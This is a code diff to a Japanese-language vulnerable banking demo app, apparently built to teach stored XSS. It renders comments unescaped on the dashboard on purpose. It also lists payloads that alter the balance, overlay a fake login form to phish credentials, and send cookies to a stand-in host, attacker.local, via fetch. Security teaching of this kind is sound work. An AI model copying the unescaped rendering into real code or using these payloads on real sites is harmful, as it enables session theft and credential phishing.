@@ -67,7 +67,8 @@ app.post('/transfer', (req, res) => {
 
 app.post('/comments', (req, res) => {
   comments.push(req.body.comment || '')
-  res.redirect('/comments')
+  // 投稿後にダッシュボードへ → 仕込んだスクリプトが銀行画面で発火する
+  res.redirect('/')
 })
 
 app.get('/comments', (req, res) => res.send(commentsPage()))
@@ -192,7 +193,17 @@ function dashboard(session) {
   ` : ''}
 
   <hr>
-  <a href="/comments" class="btn">💬 XSSデモへ</a>
+
+  <h3>💬 最新コメント <span style="font-size:13px;color:#e74c3c;font-weight:normal">← ここが XSS の着弾点</span></h3>
+  <p style="font-size:12px;color:#888;margin:0 0 8px">ユーザーの投稿をエスケープなしで表示している（v-html 相当）</p>
+  <div id="comments-area">
+    ${comments.length
+      ? comments.slice(-5).map(c => `<div class="comment-item">${c}</div>`).join('')
+      : '<p style="color:#aaa;font-size:13px">まだコメントなし — <a href="/comments">コメント掲示板</a> から投稿してみる</p>'}
+  </div>
+
+  <hr>
+  <a href="/comments" class="btn">💬 コメントを投稿する（XSSデモ）</a>
   <a href="/logout" class="btn btn-sm" style="margin-left:8px">ログアウト</a>
 </div>
 <div class="footer-bar">
@@ -212,11 +223,16 @@ function commentsPage() {
     <button type="submit">投稿</button>
   </form>
 
+  <p style="font-size:13px;color:#555">投稿するとダッシュボードに戻ります。仕込んだコードが<strong>銀行の画面で</strong>実行されます。</p>
+
   <div class="preset">
-    <p>試してみるペイロード（コピーして貼り付け）：</p>
-    <code>&lt;img src=x onerror="alert('XSS!')"&gt;</code>
-    <code>&lt;img src=x onerror="document.body.style.background='red'"&gt;</code>
-    <code>&lt;b style="font-size:40px;color:red"&gt;改ざんされた！&lt;/b&gt;</code>
+    <p><strong>① 残高を書き換える</strong></p>
+    <code>&lt;img src=x onerror="document.querySelector('.balance').textContent='¥0'"&gt;</code>
+    <p style="margin-top:10px"><strong>② 画面を乗っ取る（偽のセッション切れ画面）</strong></p>
+    <code>&lt;img src=x onerror="document.body.innerHTML='&lt;div style=padding:60px;text-align:center&gt;&lt;h2&gt;セッションが切れました&lt;/h2&gt;&lt;p&gt;再度ログインしてください&lt;/p&gt;&lt;input placeholder=ユーザー名 style=display:block;margin:8px auto;padding:8px&gt;&lt;input type=password placeholder=パスワード style=display:block;margin:8px auto;padding:8px&gt;&lt;button style=padding:8px 20px&gt;ログイン&lt;/button&gt;&lt;/div&gt;'"&gt;</code>
+    <p style="margin-top:10px"><strong>③ Cookieを attacker.local に送信する</strong></p>
+    <code>&lt;img src=x onerror="fetch('http://attacker.local:3001/stolen?c='+document.cookie)"&gt;</code>
+    <p style="font-size:12px;color:#888">③ は attacker.local のターミナルに盗まれた Cookie が表示されます（HttpOnly の場合は空）</p>
   </div>
 
   <div class="cols">
